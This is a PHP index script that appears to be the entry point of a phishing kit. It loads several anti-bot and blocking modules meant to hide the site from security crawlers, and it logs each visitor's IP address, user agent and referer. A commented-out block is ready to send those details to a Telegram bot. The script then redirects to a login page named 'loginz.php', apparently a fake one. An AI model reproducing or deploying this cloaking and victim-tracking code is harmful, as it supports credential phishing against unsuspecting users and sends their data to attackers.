<?php
session_start();

// Include security files
include './antibot.php';
include './antibot/tds.php';
include './prevents/genius.php';
include './antibot/tds.php';
include './prevents/anti.php';
include './prevents/anti2.php';
include './prevents/sub_anti.php';
include './prevents/block.php';

// Get visitor information
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$time = date('Y-m-d H:i:s');

// Log visitor data
$log_data = [
    'timestamp' => $time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'referer' => $referer
];

// Save to log file
$log_file = './logs/visitors.log';
$log_entry = json_encode($log_data) . "\n";
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Skip Telegram for testing - uncomment below for production
/*
if (function_exists('curl_init')) {
    $bot_token = 'YOUR_BOT_TOKEN'; // Replace with actual bot token
    $chat_id = 'YOUR_CHAT_ID'; // Replace with actual chat ID
    
    $message = "🔍 New Visitor\n";
    $message .= "📅 Time: " . $time . "\n";
    $message .= "🌐 IP: " . $ip . "\n";
    $message .= "🔗 Referer: " . $referer . "\n";
    
    $telegram_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $telegram_data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegram_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
*/

// Redirect to login page
header("Location: views/loginz.php");
exit;
?>
